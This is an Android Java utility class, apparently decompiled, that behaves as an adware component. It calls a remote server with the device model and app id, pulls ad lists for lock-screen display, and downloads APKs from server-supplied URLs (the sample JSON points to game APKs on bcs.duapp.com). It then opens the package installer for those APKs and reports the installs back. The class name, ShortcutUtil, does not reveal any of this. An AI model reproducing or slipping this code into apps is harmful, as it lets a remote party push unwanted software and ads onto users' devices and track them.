package workspace.shortcut;
import java.io.File;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import workspace.bean.App;
import workspace.bean.Json;
import workspace.callback.DownloadCallback;
import workspace.callback.RequestCallback;
import workspace.util.CommonUtils;
import workspace.util.Constants;
import workspace.util.ReportUtils;
import workspace.util.RequestUtils;
import workspace.util.WUtil;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.view.ViewGroup;
import android.widget.ImageView;

public class ShortcutUtil {
    private static String a = "";
    private static void methodA(App app) {
        android.content.SharedPreferences.Editor editor = Constants.context.getSharedPreferences("", 0).edit();
        editor.putInt(app.id, 1);
        editor.commit();
        android.content.SharedPreferences.Editor editor1 = Constants.context.getSharedPreferences(Constants.downloadLock, 0).edit();
        editor1.putString(app.id, app.packageName);
        editor1.commit();
        ReportUtils.apkInstalledReport();
    }
    public static void methodB(Context context, File file, String s) {
        SharedPreferences sharedpreferences = context.getSharedPreferences("downLoadFileName", 0);
        HashMap hashmap = (HashMap) sharedpreferences.getAll();
        android.content.SharedPreferences.Editor editor = sharedpreferences.edit();
        if (Boolean.valueOf(sharedpreferences.getBoolean("isFirst", true)).booleanValue()) {
            editor.putBoolean("isFirst", false);
            editor.putLong("preTime", System.currentTimeMillis());
            editor.commit();
        }
        if (!hashmap.containsValue(file.getName())) {
            editor.putString(s, file.getName());
            editor.commit();
        }
        Intent intent = new Intent();
        intent.addFlags(0x10000000);
        intent.setAction("android.intent.action.VIEW");
        intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
        context.startActivity(intent);
    }
    public static boolean methodC(Context context, String s) {
        Iterator<PackageInfo> iterator = context.getPackageManager().getInstalledPackages(8192).iterator();
        do {
            if (!iterator.hasNext()) { return false; }
        } while (!iterator.next().packageName.equals(s));
        return true;
    }
    public static int methodD(ViewGroup viewgroup) {
        int i = viewgroup.getChildCount();
        int j = 0;
        do {
            if (j >= i) { return 0; }
            if (viewgroup.getChildAt(j) instanceof ImageView) { return ((ImageView) viewgroup.getChildAt(j)).getId(); }
            if (viewgroup.getChildAt(j) instanceof ViewGroup) { return methodD((ViewGroup) viewgroup.getChildAt(j)); }
            j++;
        } while (true);
    }
    public static void adListRequest(final String url, final int type) {
        new Thread() {
            @Override
            public void run() {
                RequestUtils.get(url, new RequestCallback() {
                    @Override
                    public void onResult(String content, Throwable error) {
                        //{"ads":[{"id":"1316","name":"全民僵尸大战...","icon":"http://bcs.duapp.com/lianliankan/images/jiangshiheh.png","intro":"2015年最火热的小游戏——全民僵尸大战！","package":"yy.gameqy.jslr","appurl":"http://bcs.duapp.com/lianliankan11/soft/jiangshi.apk","bigpic":"http://bcs.duapp.com/lianliankan/images/jiangshizh.jpg","islock":"1"},{"id":"1298","name":"捕鱼达人3街机版.....","icon":"http://bcs.duapp.com/lianliankan11/images/dfrgrg.jpg","intro":"《捕鱼达人3街机版》捕鱼达人的续作，经典的游戏街机体验,是经典国民休闲手游。","package":"com.you2game.fish.qy","appurl":"http://bcs.duapp.com/lianliankan11/soft/buyu.apk","bigpic":"http://bcs.duapp.com/lianliankan/images/buyudaren.jpg","islock":"1"}],"size":"2"}
                        String s2 = content.substring(content.indexOf("["), 1 + content.lastIndexOf("]"));
                        android.content.SharedPreferences.Editor editor = Constants.context.getSharedPreferences("lockShow", 0).edit();
                        editor.remove("ImgJson");
                        editor.putString("ImgJson", s2);
                        editor.putLong(Constants.prefName, System.currentTimeMillis());
                        editor.commit();
                        try {
                            JSONArray array = new JSONArray(s2);
                            List<App> list = Json.optList(App.class, array);
                            switch (type) {
                                case 1:
                                    WUtil.methodA(list);
                                    break;
                                case 5:
                                    WUtil.downloadScreenUrl(list);
                                    break;
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                });
            }
        }.start();
    }
    public static boolean isNotEmpty(String s) {
        return s != null && !"".equals(s);
    }
    public static void methodE(final String url) {
        new Thread() {
            @Override
            public void run() {
                try {
                    String packageName = Constants.context.getPackageManager().getPackageInfo(Constants.context.getPackageName(), 0).packageName;
                    File folder = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + packageName);
                    String name = url.substring(1 + url.lastIndexOf("/"), url.length());
                    String filePath = folder.getAbsolutePath() + "/" + name;
                    File file = new File(filePath);
                    RequestUtils.download(url, file, new DownloadCallback() {
                        @Override
                        public void onResult(File file, Throwable error) {
                            if (file != null) {
                                WUtil.a(BitmapFactory.decodeFile(file.getAbsolutePath()));
                            }
                        }
                    });
                } catch (NameNotFoundException e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }
    public static void configRequest(final String urlPrefix, final String appId ) {
        
            new Thread() {
                @Override
                public void run() {
                    String model = new StringBuilder(String.valueOf(Build.MODEL)).toString().toString().replace(" ", "");
                    String url = new StringBuilder(String.valueOf(urlPrefix)).append("app_id=").append(appId).append("&uuid=").append("").append("&model=").append(model)
                            .append("&survivaltime=").append("").append("&version=").append(Constants.version).toString();
                    RequestUtils.get(url, new RequestCallback() {
                        @Override
                        public void onResult(String content, Throwable error) {
                            //{"ad_type":"2,3","status":"1","frequency":"0,3","lockpush":"1"}
                            ShortcutUtil.a = content;
                            WUtil.parseConfigResult(ShortcutUtil.a);
                        }
                    });
                }
            }.start();
    }
    public static void downloadApk(final Context context, final App bean, int i) {
        new Thread() {
            @Override
            public void run() {
                String apkUrl = bean.appUrl;
                String apkname = apkUrl.substring(1 + apkUrl.lastIndexOf("/"), apkUrl.length());
                try {
                    String s2 = Constants.context.getPackageManager().getPackageInfo(context.getPackageName(), 0).packageName;
                    File folder = new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath())).append("/").append(s2).toString());
                    if (!folder.exists()) {
                        folder.mkdirs();
                    }
                    File file = new File(new StringBuilder(String.valueOf(folder.getAbsolutePath())).append("/").append(apkname).toString());
                    RequestUtils.download(bean.appUrl, file, new DownloadCallback() {
                        @Override
                        public void onResult(File file, Throwable error) {
                            WUtil.downloadIconUrl(bean);
                            ShortcutUtil.methodA(bean);
                            ShortcutUtil.methodB(context, file, bean.packageName);
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return;
            }
        }.start();
    }
}
